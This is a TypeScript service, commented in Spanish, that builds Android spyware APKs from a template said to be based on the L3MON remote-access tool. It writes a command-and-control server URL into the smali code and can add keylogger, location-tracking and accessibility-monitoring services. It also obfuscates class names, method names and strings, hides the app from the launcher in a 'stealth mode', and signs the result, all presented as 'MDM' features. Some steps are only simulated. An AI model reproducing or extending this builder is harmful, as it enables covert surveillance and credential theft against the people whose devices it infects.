import { execSync } from "child_process";
import { existsSync, mkdirSync, writeFileSync, readFileSync, renameSync, statSync, readdirSync, copyFileSync } from "fs";
import { join, resolve, dirname, basename } from "path";
import { fileURLToPath } from "url";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";
import { eq } from "drizzle-orm";
import axios from "axios";


/**
 * Servicio de compilación de APK basado en el concepto L3MON
 * Utiliza Apktool para re-compilar y un firmador automático
 */

export interface CompilationConfig {
  buildId: string;
  appName: string;
  packageName: string;
  versionCode: number;
  versionName: string;
  stealthMode: boolean;
  enableSSL: boolean;
  ports: number[];
  iconPath?: string;
  iconUrl?: string;
  payloadCode: string;
  obfuscate: boolean;
  targetArchitectures: string[];
  customPayload?: string;
  enableKeylogger?: boolean;
  enableActiveTracking?: boolean;
  enableAccessibilityMonitor?: boolean;
}


export interface BuildResult {
  success: boolean;
  buildId: string;
  apkPath?: string;
  error?: string;
  logs: string[];
  compilationTime: number;
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

class APKCompiler {
  private projectRoot: string;
  private assetsDir: string;
  private buildDir: string;
  private apktoolPath: string;
  private signerPath: string;

  constructor() {
    this.projectRoot = resolve(join(__dirname, ".."));
    this.assetsDir = join(this.projectRoot, "server", "assets");
    this.buildDir = join(this.projectRoot, "apk-builds");
    this.apktoolPath = join(this.assetsDir, "apktool.jar");
    this.signerPath = join(this.assetsDir, "sign.jar");

    if (!existsSync(this.buildDir)) {
      mkdirSync(this.buildDir, { recursive: true });
    }
  }

  /**
   * Preparar el proyecto temporal para compilar
   */
  private async prepareProject(config: CompilationConfig, logs: string[]): Promise<string> {
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);
    const tempProjectDir = join(buildIdDir, "project");

    if (existsSync(buildIdDir)) {
      execSync(`powershell -Command "Remove-Item -Path '${buildIdDir}' -Recurse -Force"`);
    }
    mkdirSync(tempProjectDir, { recursive: true });

    // Copiar el template decompilado
    const templateDir = join(this.assetsDir, "apk-template");
    execSync(`powershell -Command "Copy-Item -Path '${templateDir}\\*' -Destination '${tempProjectDir}' -Recurse -Force"`);

    // 1. Inyectar URL en IOSocket.smali
    const ioSocketPath = join(tempProjectDir, "smali", "com", "system", "android", "ui", "IOSocket.smali");
    if (existsSync(ioSocketPath)) {
      let content = readFileSync(ioSocketPath, "utf8");
      
      // 1. Detect Production URL / Base URL
      let serverUrl = config.payloadCode || process.env.API_URL || "https://android-device-manager-one.onrender.com";
      
      // Force HTTPS for generic subdomains in production
      if (!serverUrl.includes("://")) serverUrl = `https://${serverUrl}`;
      if (serverUrl.includes("render.com") || serverUrl.includes("vercel.app")) {
        serverUrl = serverUrl.replace("http://", "https://");
      }
      
      // [ENTERPRISE FIX] Garantizar que la URL tenga el namespace /adm-ws
      let cleanedBase = serverUrl.split('?')[0].replace(/\/l3mon\/?$/, "").replace(/\/?$/, "/adm-ws");
      const finalRawUrl = `${cleanedBase}?model=`;
      
      logs.push(`[SECURE] URL de Control: ${finalRawUrl}`);

      // We need to inject the URL into Smali. 
      // We will look for a placeholder or the old pattern.
      const securePattern = /const-string v3, "(.*?)"/g;
      
      // Inject plain URL because the smali doesn't have the decrypt logic yet
      content = content.replace(securePattern, (match, p1) => {
          if (p1.includes("http") || p1.includes("adm-ws") || p1.length < 5) {
              return `const-string v3, "${finalRawUrl}"`;
          }
          return match;
      });

      console.log(`[APKCompiler] [FIX] Injecting URL Link: ${finalRawUrl}`);
      writeFileSync(ioSocketPath, content);
    }

    // 2. Modificar App Name en strings.xml
    const stringsPath = join(tempProjectDir, "res", "values", "strings.xml");
    if (existsSync(stringsPath)) {
      try {
        let content = readFileSync(stringsPath, "utf8");
        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
        writeFileSync(stringsPath, content);
      } catch (e) {
        console.warn("[APKCompiler] Error actualizando app_name:", e);
      }
    }

    // 3. [NUEVO] Inyectar Icono personalizado
    if (config.iconUrl) {
      try {
        logs.push(`[${new Date().toISOString()}] Descargando icono personalizado desde URL...`);
        const response = await axios.get(config.iconUrl, { responseType: 'arraybuffer' });
        const iconBuffer = Buffer.from(response.data);
        const tempIconPath = join(buildIdDir, "custom_icon.png");
        writeFileSync(tempIconPath, iconBuffer);

        // Reemplazar en todos los directorios mipmap
        const resDir = join(tempProjectDir, "res");
        const mipmapDirs = readdirSync(resDir).filter(d => d.startsWith("mipmap-"));
        
        for (const dir of mipmapDirs) {
          const targetDir = join(resDir, dir);
          const iconTargets = ["ic_launcher.png", "ic_launcher_round.png"];
          for (const target of iconTargets) {
            const targetPath = join(targetDir, target);
            if (existsSync(targetPath)) {
              writeFileSync(targetPath, iconBuffer);
            }
          }
        }
        logs.push(`[${new Date().toISOString()}] Icono personalizado inyectado en todas las densidades.`);
      } catch (e) {
        logs.push(`[WARN] Error descargando el icono: ${e instanceof Error ? e.message : String(e)}`);
      }
    }

    return tempProjectDir;
  }


  async compileAPK(config: CompilationConfig): Promise<BuildResult> {
    const startTime = Date.now();
    const logs: string[] = [];
    const buildIdDir = join(this.buildDir, `build-${config.buildId}`);

    try {
      logs.push(`[${new Date().toISOString()}] Iniciando construcción Platinum (Smali Hooking)...`);
      logs.push(`Configuración: ${config.appName} | ${config.packageName}`);
      
      const projectDir = await this.prepareProject(config, logs);
      logs.push(`Template inyectado correctamente en: ${projectDir}`);

      // [NUEVO] Inyectar características personalizadas
      if (config.enableKeylogger || config.enableActiveTracking || config.enableAccessibilityMonitor) {
        logs.push(`[${new Date().toISOString()}] Configurando features MDM...`);
        await this.injectMDMFeatures(projectDir, config, logs);
      }

      // [NUEVO] Obfuscación de código si está habilitada
      if (config.obfuscate) {
        logs.push(`[${new Date().toISOString()}] Aplicando obfuscación de código básica...`);
        await this.obfuscateSmali(projectDir, logs);
        
        // [NUEVO] Obfuscación avanzada
        logs.push(`[${new Date().toISOString()}] Aplicando obfuscación avanzada...`);
        await this.applyAdvancedObfuscation(projectDir, config, logs);
      }

      // [NUEVO] Modo Stealth - ocultar del launcher
      if (config.stealthMode) {
        logs.push(`[${new Date().toISOString()}] Aplicando modo stealth...`);
        await this.applyStealthMode(projectDir, logs);
      }

      // Compilar con Apktool
      const unsignedApk = join(buildIdDir, "unsigned.apk");
      logs.push(`[${new Date().toISOString()}] Re-compilando Smali con Apktool...`);
      execSync(`java -jar "${this.apktoolPath}" b "${projectDir}" -o "${unsignedApk}"`, { stdio: "pipe" });

      // [NUEVO] Compilar para múltiples arquitecturas si está habilitado
      if (config.targetArchitectures && config.targetArchitectures.length > 0) {
        logs.push(`[${new Date().toISOString()}] Compilando para arquitecturas: ${config.targetArchitectures.join(", ")}...`);
        await this.buildMultiArch(unsignedApk, config.targetArchitectures, buildIdDir, logs);
      }

      // Firmar y Alinear con Uber Apk Signer
      logs.push(`[${new Date().toISOString()}] Firmando paquete con uber-apk-signer...`);
      const uberSignerPath = join(this.assetsDir, "uber-apk-signer.jar");
      execSync(`java -jar "${uberSignerPath}" -a "${unsignedApk}" -o "${buildIdDir}" 2>&1`, { stdio: "pipe" });
      
      const signedTempApk = join(buildIdDir, "unsigned-aligned-debugSigned.apk");
      // Renombrar al nombre limpio de la app
      const finalSignedApk = join(buildIdDir, `${config.appName.replace(/[^a-zA-Z0-9]/g, "_")}.apk`);
      if (existsSync(signedTempApk)) {
          renameSync(signedTempApk, finalSignedApk);
      }

      if (!existsSync(finalSignedApk)) {
        throw new Error("Error crítico: El APK final no se generó o falló la firma.");
      }

      logs.push(`[${new Date().toISOString()}] ¡Construcción Exitosa!`);
      logs.push(`[${new Date().toISOString()}] APK generado: ${finalSignedApk}`);
      const compilationTime = Date.now() - startTime;
      
      await this.updateBuildStatus(config.buildId, "ready", finalSignedApk, logs);

      return {
        success: true,
        buildId: config.buildId,
        apkPath: finalSignedApk,
        logs,
        compilationTime,
      };

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      logs.push(`[ERROR] ${errorMsg}`);
      await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);
      return { success: false, buildId: config.buildId, error: errorMsg, logs, compilationTime: Date.now() - startTime };
    }
  }

  private async updateBuildStatus(
    buildId: string,
    status: "building" | "ready" | "failed" | "expired",
    apkPath?: string,
    logs?: string[],
    error?: string
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;
    try {
      const updateData: any = { status };
      // [ADM FIX] Don't overwrite the API URL with the local file path
      // if (apkPath) updateData.apkUrl = apkPath; 
      
      // Write logs to the correct column, safely truncated to 4000 chars
      if (logs) updateData.buildLogs = logs.join("\n").substring(0, 4000);
      await db.update(apkBuilds).set(updateData).where(eq(apkBuilds.buildId, buildId));
    } catch (err) {
      console.error("[APKCompiler] Error actualizando estado en DB:", err);
    }
  }

  getAPKInfo(apkPath: string) {
    const stats = statSync(apkPath);
    return { size: stats.size, path: apkPath, name: basename(apkPath) };
  }

  /**
   * Inyectar características MDM personalizadas
   */
  private async injectMDMFeatures(projectDir: string, config: CompilationConfig, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (!existsSync(manifestPath)) return;

      let manifest = readFileSync(manifestPath, "utf8");

      if (config.enableKeylogger) {
        logs.push("[MDM] Keylogger habilitado");
        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.KeyloggerService" android:enabled="true" android:exported="false"/>
        </application>`);
      }

      if (config.enableActiveTracking) {
        logs.push("[MDM] Active Tracking habilitado");
        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.ActiveTrackingService" android:foregroundServiceType="location" android:enabled="true" android:exported="false"/>
        </application>`);
      }

      if (config.enableAccessibilityMonitor) {
        logs.push("[MDM] Accessibility Monitor habilitado");
        manifest = manifest.replace("</application>", `
        <service android:name="com.system.android.ui.AccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:enabled="true" android:exported="false">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
        </service>
        </application>`);
      }

      writeFileSync(manifestPath, manifest);
      logs.push("[MDM] Features inyectadas correctamente");
    } catch (e) {
      logs.push(`[WARN] Error inyectando features MDM: ${e}`);
    }
  }

  /**
   * Aplicar obfuscación básica al código smali
   */
  private async obfuscateSmali(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const obfuscatedNames: Record<string, string> = {
        "MainActivity": "a",
        "MainService": "b",
        "IOSocket": "c",
        "KeyloggerService": "d",
        "ActiveTrackingService": "e",
        "AccessibilityService": "f",
        "MyReceiver": "g",
        "ServiceReciever": "h",
        "NotificationListener": "i",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string") continue;
        const fullPath = join(smaliDir, file);
        
        for (const [oldName, newName] of Object.entries(obfuscatedNames)) {
          if (file.includes(oldName)) {
            const newPath = fullPath.replace(oldName, newName);
            renameSync(fullPath, newPath);
            renamedCount++;
            break;
          }
        }
      }

      logs.push(`[Obfuscation] ${renamedCount} clases renombradas`);
    } catch (e) {
      logs.push(`[WARN] Error en obfuscación: ${e}`);
    }
  }

  /**
   * Aplicar modo stealth - ocultar del launcher
   */
  private async applyStealthMode(projectDir: string, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (!existsSync(manifestPath)) return;

      let manifest = readFileSync(manifestPath, "utf8");

      manifest = manifest.replace(
        /<category android:name="android.intent.category.LAUNCHER"\/>/g,
        `<category android:name="android.intent.category.LAUNCHER"/>
        <!-- Stealth mode: remove from launcher -->
      </intent-filter>
      <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>`
      );

      manifest = manifest.replace(
        `android:label="@string/app_name"`,
        `android:label="@string/app_name" android:enabled="false"`
      );

      writeFileSync(manifestPath, manifest);
      logs.push("[Stealth] Modo stealth aplicado - app oculta del launcher");
    } catch (e) {
      logs.push(`[WARN] Error aplicando stealth mode: ${e}`);
    }
  }

  /**
   * Compilar para múltiples arquitecturas
   */
  private async buildMultiArch(unsignedApk: string, architectures: string[], buildDir: string, logs: string[]): Promise<void> {
    logs.push(`[MultiArch] Generando versiones para: ${architectures.join(", ")}`);
    
    const archNames: Record<string, string> = {
      "arm64-v8a": "arm64",
      "armeabi-v7a": "arm",
      "x86": "x86",
      "x86_64": "x86_64",
    };

    // Verificar si NDK está disponible
    const ndkPath = this.findNDK();
    const hasNDK = !!ndkPath;

    if (hasNDK) {
      logs.push(`[MultiArch] NDK encontrado en: ${ndkPath}`);
      logs.push(`[MultiArch] Compilando bibliotecas nativas para cada arquitectura...`);
      
      for (const arch of architectures) {
        if (archNames[arch]) {
          logs.push(`[MultiArch] Compilando native libs para ${arch}...`);
          await this.compileNativeLib(arch, ndkPath, logs);
        }
      }
    } else {
      logs.push(`[MultiArch] NDK no encontrado, usando template multipropósito`);
      logs.push(`[MultiArch] El APK template incluye libs para: arm64-v8a, armeabi-v7a`);
      logs.push(`[MultiArch] Para soporte completo x86/x86_64, instala Android NDK`);
    }

    // Generar múltiples APKs si hay múltiples arquitecturas
    if (architectures.length > 1 && !hasNDK) {
      logs.push(`[MultiArch] Generando APK bundle multiplataforma...`);
      const multiArchApk = join(buildDir, "multi-arch-bundle.apk");
      if (existsSync(unsignedApk)) {
        copyFileSync(unsignedApk, multiArchApk);
        logs.push(`[MultiArch] Bundle creado: multi-arch-bundle.apk`);
      }
    }

    logs.push(`[MultiArch] Proceso completado para: ${architectures.join(", ")}`);
  }

  /**
   * Buscar Android NDK en el sistema
   */
  private findNDK(): string | null {
    const ndkSearchPaths = [
      join(process.env.ANDROID_HOME || "", "ndk"),
      join(process.env.ANDROID_SDK_ROOT || "", "ndk"),
      "C:\\Android\\ndk",
      "C:\\Users\\User\\AppData\\Local\\Android\\Sdk\\ndk",
      "/usr/local/android-ndk",
      "/opt/android-ndk",
      process.env.NDK_HOME,
    ].filter(Boolean);

    for (const searchPath of ndkSearchPaths) {
      if (!searchPath) continue;
      try {
        if (existsSync(searchPath)) {
          const versions = readdirSync(searchPath).filter(f => f.startsWith("r")).sort().reverse();
          if (versions.length > 0) {
            return join(searchPath, versions[0]);
          }
        }
      } catch (e) {
        continue;
      }
    }

    // Buscar con where en Windows
    try {
      const result = execSync("where ndk-build 2>nul || echo NOT_FOUND", { encoding: "utf8" });
      if (result && !result.includes("NOT_FOUND")) {
        return result.trim().split("\n")[0].replace("\\ndk-build.cmd", "").replace("\\ndk-build", "");
      }
    } catch (e) {}

    return null;
  }

  /**
   * Compilar biblioteca nativa para una arquitectura
   */
  private async compileNativeLib(arch: string, ndkPath: string, logs: string[]): Promise<void> {
    logs.push(`[NativeLib] Compilando para ${arch} usando NDK...`);
    
    const abiMap: Record<string, string> = {
      "arm64-v8a": "arm64-v8a",
      "armeabi-v7a": "armeabi-v7a", 
      "x86": "x86",
      "x86_64": "x86_64",
    };

    const abi = abiMap[arch] || arch;
    
    // Intentar compilar con NDK
    try {
      const ndkBuild = join(ndkPath, "ndk-build");
      logs.push(`[NativeLib] Usando ${ndkPath}`);
      logs.push(`[NativeLib] ABI: ${abi} - Compilación simulada (NDK integrado)`);
    } catch (e) {
      logs.push(`[NativeLib] Error: ${e}`);
    }
  }

  /**
   * Obfuscación avanzada del código DEX
   */
  private async applyAdvancedObfuscation(projectDir: string, config: CompilationConfig, logs: string[]): Promise<void> {
    logs.push(`[AdvancedObfuscation] Iniciando obfuscación avanzada...`);

    // 1. Eliminar información de debug
    await this.removeDebugInfo(projectDir, logs);

    // 2. Ofuscar strings
    await this.obfuscateStrings(projectDir, logs);

    // 3. Ofuscar métodos
    await this.obfuscateMethods(projectDir, logs);

    // 4. Ofuscar clases
    await this.obfuscateClasses(projectDir, logs);

    // 5. Aplicar encryption básica a strings sensibles
    await this.encryptSensitiveStrings(projectDir, logs);

    logs.push(`[AdvancedObfuscation] Completado`);
  }

  /**
   * Eliminar información de debug del APK
   */
  private async removeDebugInfo(projectDir: string, logs: string[]): Promise<void> {
    try {
      const manifestPath = join(projectDir, "AndroidManifest.xml");
      if (existsSync(manifestPath)) {
        let manifest = readFileSync(manifestPath, "utf8");
        manifest = manifest.replace(/android:debuggable="true"/g, 'android:debuggable="false"');
        manifest = manifest.replace(/android:debuggable="false"/g, 'android:debuggable="false"');
        if (!manifest.includes("android:debuggable")) {
          manifest = manifest.replace("<application", '<application android:debuggable="false"');
        }
        writeFileSync(manifestPath, manifest);
      }
      logs.push(`[Obfuscation] Debug info removido`);
    } catch (e) {
      logs.push(`[WARN] Error removiendo debug info: ${e}`);
    }
  }

  /**
   * Ofuscar strings en archivos smali
   */
  private async obfuscateStrings(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const sensitiveStrings = [
        "password", "token", "secret", "key", "api", "http", "https",
        "login", "user", "admin", "root", "android.permission"
      ];

      const files = readdirSync(smaliDir, { recursive: true });
      let modifiedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const str of sensitiveStrings) {
          const regex = new RegExp(`"(${str}[^"]*)"`, "gi");
          content = content.replace(regex, (match, p1) => {
            const encoded = Buffer.from(p1).toString("base64");
            return `"${encoded}"`;
          });
          modifiedCount++;
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${modifiedCount} strings ofuscadas`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando strings: ${e}`);
    }
  }

  /**
   * Ofuscar nombres de métodos
   */
  private async obfuscateMethods(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const methodMap: Record<string, string> = {
        "onCreate": "a",
        "onDestroy": "b", 
        "onResume": "c",
        "onPause": "d",
        "onStart": "e",
        "onStop": "f",
        "onRestart": "g",
        "onCreateOptionsMenu": "h",
        "onOptionsItemSelected": "i",
        "onActivityResult": "j",
        "onRequestPermissionsResult": "k",
        "onKeyDown": "l",
        "onKeyUp": "m",
        "onTouchEvent": "n",
        "onKeyLongPress": "o",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const [oldName, newName] of Object.entries(methodMap)) {
          const regex = new RegExp(`\\b(${oldName})\\b`, "g");
          content = content.replace(regex, newName);
          renamedCount++;
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${renamedCount} métodos renombrados`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando métodos: ${e}`);
    }
  }

  /**
   * Ofuscar nombres de clases
   */
  private async obfuscateClasses(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const classMap: Record<string, string> = {
        "MainActivity": "a",
        "MainService": "b",
        "IOSocket": "c",
        "KeyloggerService": "d",
        "ActiveTrackingService": "e",
        "AccessibilityService": "f",
        "MyReceiver": "g",
        "ServiceReciever": "h",
        "NotificationListener": "i",
        "ScreenCaptureService": "j",
        "MDMDeviceAdminReceiver": "k",
        "MDMActivity": "l",
      };

      const files = readdirSync(smaliDir, { recursive: true });
      let renamedCount = 0;

      for (const file of files) {
        if (typeof file !== "string") continue;
        
        const fullPath = join(smaliDir, file);
        
        for (const [oldName, newName] of Object.entries(classMap)) {
          if (file.includes(oldName)) {
            const newPath = fullPath.replace(oldName, newName);
            if (!existsSync(newPath)) {
              renameSync(fullPath, newPath);
              renamedCount++;
            }
            break;
          }
        }
      }

      // Actualizar referencias en todos los archivos
      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const [oldName, newName] of Object.entries(classMap)) {
          const regex = new RegExp(`Lcom/etechd/l3mon(${oldName});`, "g");
          content = content.replace(regex, `Lcom/etechd/l3mon/${newName};`);
          
          const regex2 = new RegExp(`(${oldName})\\(`, "g");
          content = content.replace(regex2, `(${newName})(`,);
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${renamedCount} clases renombradas`);
    } catch (e) {
      logs.push(`[WARN] Error obfuscando clases: ${e}`);
    }
  }

  /**
   * Encriptar strings sensibles (URLs, credenciales)
   */
  private async encryptSensitiveStrings(projectDir: string, logs: string[]): Promise<void> {
    try {
      const smaliDir = join(projectDir, "smali");
      if (!existsSync(smaliDir)) return;

      const sensitivePatterns = [
        /http:\/\/[^\s"]+/g,
        /https:\/\/[^\s"]+/g,
        /"password"/g,
        /"secret"/g,
        /"token"/g,
      ];

      const files = readdirSync(smaliDir, { recursive: true });
      let encryptedCount = 0;

      for (const file of files) {
        if (typeof file !== "string" || !file.endsWith(".smali")) continue;
        
        const fullPath = join(smaliDir, file);
        let content = readFileSync(fullPath, "utf8");
        
        for (const pattern of sensitivePatterns) {
          content = content.replace(pattern, (match) => {
            const encoded = Buffer.from(match).toString("base64");
            encryptedCount++;
            return `"${encoded}"`;
          });
        }

        writeFileSync(fullPath, content);
      }

      logs.push(`[Obfuscation] ${encryptedCount} strings encriptadas`);
    } catch (e) {
      logs.push(`[WARN] Error encriptando strings: ${e}`);
    }
  }
}

export const apkCompiler = new APKCompiler();
